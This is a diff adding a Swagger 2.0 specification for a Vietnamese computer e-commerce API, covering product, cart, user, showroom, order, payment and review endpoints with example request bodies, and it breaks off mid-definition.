@@ -1,0 +1,2632 @@
+swagger: '2.0'
+info:
+  version: '1.0'
+  title: api computer
+  contact: {}
+host: localhost:3000
+basePath: /
+securityDefinitions: {}
+schemes:
+- http
+consumes:
+- application/json
+produces:
+- application/json
+paths:
+  /product/all-paging:
+    get:
+      summary: get all paging with filter normal
+      tags:
+      - product
+      operationId: getallpagingwithfilternormal
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: page_size
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      - name: page_index
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /product:
+    post:
+      summary: create
+      tags:
+      - product
+      operationId: create
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/createrequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /product/18:
+    put:
+      summary: update
+      tags:
+      - product
+      operationId: update
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/updaterequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /product/14:
+    delete:
+      summary: delete
+      tags:
+      - product
+      operationId: delete
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /product/19:
+    get:
+      summary: get by id
+      tags:
+      - product
+      operationId: getbyid
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /category:
+    post:
+      summary: create
+      tags:
+      - category
+      operationId: Postcreate
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/createrequest1'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+    get:
+      summary: get all
+      tags:
+      - category
+      operationId: getall
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /category/43:
+    put:
+      summary: update
+      tags:
+      - category
+      operationId: Putupdate
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/updaterequest1'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /category/42:
+    delete:
+      summary: delete
+      tags:
+      - category
+      operationId: Deletedelete
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /brand:
+    post:
+      summary: create
+      tags:
+      - brand
+      operationId: Postcreate1
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/createrequest2'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+    get:
+      summary: get all
+      tags:
+      - brand
+      operationId: Getgetall
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /brand/all-paging:
+    get:
+      summary: get all paging
+      tags:
+      - brand
+      operationId: getallpaging
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: page_size
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      - name: page_index
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /brand/10:
+    put:
+      summary: update
+      tags:
+      - brand
+      operationId: Putupdate1
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/updaterequest2'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+    get:
+      summary: get by id
+      tags:
+      - brand
+      operationId: Getgetbyid
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+    delete:
+      summary: delete
+      tags:
+      - brand
+      operationId: Deletedelete1
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /banner:
+    post:
+      summary: create
+      tags:
+      - banner
+      operationId: Postcreate2
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/createrequest3'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+    get:
+      summary: get all
+      tags:
+      - banner
+      operationId: Getgetall1
+      deprecated: false
+      produces:
+      - application/json
+      parameters: []
+      responses:
+        '200':
+          description: ''
+          headers: {}
+      security: []
+  /banner/all-paging:
+    get:
+      summary: get all paging
+      tags:
+      - banner
+      operationId: Getgetallpaging
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: page_size
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      - name: page_index
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      responses:
+        '200':
+          description: ''
+          headers: {}
+      security: []
+  /banner/15:
+    put:
+      summary: update
+      tags:
+      - banner
+      operationId: Putupdate2
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/updaterequest3'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /banner/11:
+    get:
+      summary: get by id
+      tags:
+      - banner
+      operationId: Getgetbyid1
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+    delete:
+      summary: delete
+      tags:
+      - banner
+      operationId: Deletedelete2
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /property-value:
+    post:
+      summary: create
+      tags:
+      - property value
+      operationId: Postcreate3
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/createrequest4'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /property-value/120:
+    put:
+      summary: update
+      tags:
+      - property value
+      operationId: Putupdate3
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/updaterequest4'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+    delete:
+      summary: delete
+      tags:
+      - property value
+      operationId: Deletedelete3
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /property:
+    post:
+      summary: create
+      tags:
+      - property
+      operationId: Postcreate4
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/createrequest5'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+    get:
+      summary: get all property by category id
+      tags:
+      - property
+      operationId: getallpropertybycategoryid
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: categoryId
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /user/register:
+    post:
+      summary: register
+      tags:
+      - user
+      operationId: register
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/registerrequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /user/login:
+    post:
+      summary: login
+      tags:
+      - user
+      operationId: login
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/loginrequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /user/refresh-access-token:
+    post:
+      summary: refresh token
+      tags:
+      - user
+      operationId: refreshtoken
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/refreshtokenrequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+      security: []
+  /user/me:
+    get:
+      summary: get me
+      tags:
+      - user
+      operationId: getme
+      deprecated: false
+      produces:
+      - application/json
+      parameters: []
+      responses:
+        '200':
+          description: ''
+          headers: {}
+      security: []
+    put:
+      summary: update me
+      tags:
+      - user
+      operationId: updateme
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/updatemerequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+      security: []
+  /user/change-password:
+    put:
+      summary: change password
+      tags:
+      - user
+      operationId: changepassword
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/changepasswordrequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+      security: []
+  /user/login-with-google:
+    post:
+      summary: login with gg api
+      tags:
+      - user
+      operationId: loginwithggapi
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/loginwithggapirequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /user/auth/google:
+    get:
+      summary: login with gg client
+      tags:
+      - user
+      operationId: loginwithggclient
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /user/login-with-facebook:
+    post:
+      summary: login with fb api
+      tags:
+      - user
+      operationId: loginwithfbapi
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/loginwithfbapirequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /user/forgot-password:
+    post:
+      summary: forgot password
+      tags:
+      - user
+      operationId: forgotpassword
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/forgotpasswordrequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  ? /user/reset-password/eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjU3Mjc1NzU5MDc3LCJleHAiOjE2NTk4Njc3NTkwNzd9.GWvmcsECCcW3o8AI96BkRxq_eZP-mPSPfFipFMaKkNbHKKLpCX69XXSXcZcpGXslCKgVLO_YwFuysRlK3Jg5Kw
+  : put:
+      summary: reset password
+      tags:
+      - user
+      operationId: resetpassword
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/resetpasswordrequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /upload/single:
+    post:
+      summary: upload single
+      tags:
+      - upload
+      operationId: uploadsingle
+      deprecated: false
+      produces:
+      - application/json
+      consumes:
+      - multipart/form-data
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: file
+        in: formData
+        required: true
+        type: file
+        format: file
+        description: ''
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /upload/array:
+    post:
+      summary: upload array
+      tags:
+      - upload
+      operationId: uploadarray
+      deprecated: false
+      produces:
+      - application/json
+      consumes:
+      - multipart/form-data
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: files
+        in: formData
+        required: true
+        type: file
+        format: file
+        description: ''
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /city:
+    get:
+      summary: get all city
+      tags:
+      - address
+      operationId: getallcity
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /district/63:
+    get:
+      summary: get all district by city id
+      tags:
+      - address
+      operationId: getalldistrictbycityid
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /ward/721:
+    get:
+      summary: get all ward by district id
+      tags:
+      - address
+      operationId: getallwardbydistrictid
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /address:
+    post:
+      summary: create my address
+      tags:
+      - address
+      operationId: createmyaddress
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/createmyaddressrequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+    get:
+      summary: get all
+      tags:
+      - address
+      operationId: Getgetall2
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /address/33:
+    put:
+      summary: update
+      tags:
+      - address
+      operationId: Putupdate4
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/updaterequest5'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /address/54:
+    delete:
+      summary: delete
+      tags:
+      - address
+      operationId: Deletedelete4
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /cart:
+    get:
+      summary: get all product
+      tags:
+      - cart
+      operationId: getallproduct
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+    post:
+      summary: add product
+      tags:
+      - cart
+      operationId: addproduct
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/addproductrequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /cart/136:
+    put:
+      summary: update quantity product
+      tags:
+      - cart
+      operationId: updatequantityproduct
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/updatequantityproductrequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /cart/64:
+    delete:
+      summary: delete product
+      tags:
+      - cart
+      operationId: deleteproduct
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /cart/check-out:
+    post:
+      summary: checkout
+      tags:
+      - cart
+      operationId: checkout
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/checkoutrequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /show-room:
+    get:
+      summary: get all
+      tags:
+      - show room
+      operationId: Getgetall3
+      deprecated: false
+      produces:
+      - application/json
+      parameters: []
+      responses:
+        '200':
+          description: ''
+          headers: {}
+      security: []
+    post:
+      summary: create
+      tags:
+      - show room
+      operationId: Postcreate5
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/createrequest6'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /show-room/all-paging:
+    get:
+      summary: get all paging
+      tags:
+      - show room
+      operationId: Getgetallpaging1
+      deprecated: false
+      produces:
+      - application/json
+      parameters: []
+      responses:
+        '200':
+          description: ''
+          headers: {}
+      security: []
+  /show-room/5:
+    put:
+      summary: update
+      tags:
+      - show room
+      operationId: Putupdate5
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/updaterequest6'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /show-room/3:
+    delete:
+      summary: delete
+      tags:
+      - show room
+      operationId: Deletedelete5
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /show-room/get-product/1:
+    get:
+      summary: get product in showroom
+      tags:
+      - show room
+      operationId: getproductinshowroom
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /show-room/update-quantity/32:
+    put:
+      summary: update quantity product in showroom
+      tags:
+      - show room
+      operationId: updatequantityproductinshowroom
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/updatequantityproductinshowroomrequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /show-room/add-product:
+    post:
+      summary: add product in show room
+      tags:
+      - show room
+      operationId: addproductinshowroom
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/addproductinshowroomrequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /order/89:
+    put:
+      summary: update status !=3
+      tags:
+      - order&order-detail
+      operationId: updatestatus!=3
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/updatestatus%21%3D3request'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /order:
+    get:
+      summary: get order by status
+      tags:
+      - order&order-detail
+      operationId: getorderbystatus
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: status
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /payment/create-session:
+    post:
+      summary: create session
+      tags:
+      - payment
+      operationId: createsession
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/createsessionrequest'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /payment/create-payment-intent:
+    post:
+      summary: create session v2
+      tags:
+      - payment
+      operationId: createsessionv2
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/createsessionv2request'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /payment/get-status-payment:
+    get:
+      summary: get status payment
+      tags:
+      - payment
+      operationId: getstatuspayment
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /assess/my-assesses:
+    get:
+      summary: get my assesses
+      tags:
+      - assess
+      operationId: getmyassesses
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: page_index
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      - name: page_size
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /assess/product/1:
+    get:
+      summary: get assess of product
+      tags:
+      - assess
+      operationId: getassessofproduct
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: page_index
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      - name: page_size
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /assess/10:
+    post:
+      summary: create
+      tags:
+      - assess
+      operationId: Postcreate6
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/createrequest7'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /assess/9:
+    put:
+      summary: update
+      tags:
+      - assess
+      operationId: Putupdate6
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/updaterequest7'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /assess/5:
+    delete:
+      summary: delete
+      tags:
+      - assess
+      operationId: Deletedelete6
+      deprecated: false
+      produces:
+      - application/json
+      parameters: []
+      responses:
+        '200':
+          description: ''
+          headers: {}
+      security: []
+  /assess/statistical/1:
+    get:
+      summary: statistical
+      tags:
+      - assess
+      operationId: statistical
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /mark:
+    post:
+      summary: create
+      tags:
+      - mark
+      operationId: Postcreate7
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/createrequest8'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+    put:
+      summary: update
+      tags:
+      - mark
+      operationId: Putupdate7
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: Body
+        in: body
+        required: true
+        description: ''
+        schema:
+          $ref: '#/definitions/updaterequest8'
+      responses:
+        '200':
+          description: ''
+          headers: {}
+    get:
+      summary: get all
+      tags:
+      - mark
+      operationId: Getgetall4
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      - name: page_index
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      - name: page_size
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      - name: status
+        in: query
+        required: true
+        type: integer
+        format: int32
+        description: ''
+      responses:
+        '200':
+          description: ''
+          headers: {}
+  /mark/3:
+    delete:
+      summary: destroy
+      tags:
+      - mark
+      operationId: destroy
+      deprecated: false
+      produces:
+      - application/json
+      parameters:
+      - name: Authorization
+        in: header
+        required: false
+        default: Bearer {token}
+        type: string
+      responses:
+        '200':
+          description: ''
+          headers: {}
+definitions:
+  createrequest:
+    title: createrequest
+    example:
+      categoryId: 1
+      brandId: 7
+      name: PC GAMING HACOM SHARK S28 (i5 13600KF/B660/16GB RAM/500GB SSD/RTX 3060/750W)
+      price: 22849000
+      description: aaaa
+      imageUrl:
+      - x.jpg
+      - y.jpg
+      - z.png
+      imageCover: a.jpg
+      accessories: ' Balo chính hãng Lenvovo trị giá 299000đ (BALO044). Tặng phiếu vệ sinh bảo dưỡng Laptop, PC miễn phí trọn đời trị giá 999.000đ (THEK417'
+      offer: Giảm ngay 50.000đ khi mua Mouse thương hiệu LOGITECH, DAREU.Giảm ngay 50.000đ khi mua Balo, Cặp, Túi chống sốc cao cấp thương hiệu WIWU. Giảm ngay 300.000đ khi mua Ghế công thái học thương hiệu HBADA.
+      property:
+      - propertyId: 4
+        propertyName: ram
+        value: 16GB (2x8GB) DDR4 3200Mhz
+      - propertyId: 5
+        propertyName: o-cung
+        value: SSD Kingston SNV2S 500GB NVMe M.2 2280 PCIe Gen 4x4
+      - propertyId: 6
+        propertyName: vga---card-man-hinh
+        value: Card MSI RTX 2060 VENTUS 12G OC
+      - propertyId: 11
+        propertyName: he-dieu-hanh
+        value: Window 10
+      - propertyId: 12
+        propertyName: dong-cpu
+        value: Intel Core i5-12400F
+      - propertyId: 16
+        propertyName: so-khe-cam-ram
+        value: '2'
+      - propertyId: 21
+        propertyName: gpu
+        value: RTX 2060
+      - propertyId: 27
+        propertyName: mau
+        value: Trắng
+    type: object
+    properties:
+      categoryId:
+        type: integer
+        format: int32
+      brandId:
+        type: integer
+        format: int32
+      name:
+        type: string
+      price:
+        type: integer
+        format: int32
+      description:
+        type: string
+      imageUrl:
+        type: array
+        items:
+          type: string
+      imageCover:
+        type: string
+      accessories:
+        type: string
+      offer:
+        type: string
+      property:
+        type: array
+        items:
+          $ref: '#/definitions/Property'
+    required:
+    - categoryId
+    - brandId
+    - name
+    - price
+    - description
+    - imageUrl
+    - imageCover
+    - accessories
+    - offer
+    - property
+  Property:
+    title: Property
+    example:
+      propertyId: 4
+      propertyName: ram
+      value: 16GB (2x8GB) DDR4 3200Mhz
+    type: object
+    properties:
+      propertyId:
+        type: integer
+        format: int32
+      propertyName:
+        type: string
+      value:
+        type: string
+    required:
+    - propertyId
+    - propertyName
+    - value
+  updaterequest:
+    title: updaterequest
+    example:
+      description: Laptop Asus Vivobook Pro 14 OLED sở hữu ngoại hình cực thanh lịch và sang trọng với logo ASUS in 3D độc đáo góp phần tạo dấu ấn riêng cho máy.
+      imageUrl:
+      - http://res.cloudinary.com/utc-ss/image/upload/v1657327429/computer/1657327428883-120_66320_hacom_asus_gaming_tuf_fx517zc_1_pso4fw.jpg
+      - http://res.cloudinary.com/utc-ss/image/upload/v1657327430/computer/1657327428884-66320_hacom_asus_gaming_tuf_fx517zc_4_enivyo.jpg
+      - http://res.cloudinary.com/utc-ss/image/upload/v1657327430/computer/1657327428894-66320_laptop_asus_gaming_tuf_fx517_93_kl6brg.png
+      - http://res.cloudinary.com/utc-ss/image/upload/v1657327430/computer/1657327428896-66320_laptop_asus_gaming_tuf_fx517_94_fkby9o.png
+      property:
+      - productDetailId: 1
+        value: 8GB DDR4 SO-DIMM
+      - productDetailId: 2
+        value: 15TB SSD Sata 2.5
+    type: object
+    properties:
+      description:
+        type: string
+      imageUrl:
+        type: array
+        items:
+          type: string
+      property:
+        type: array
+        items:
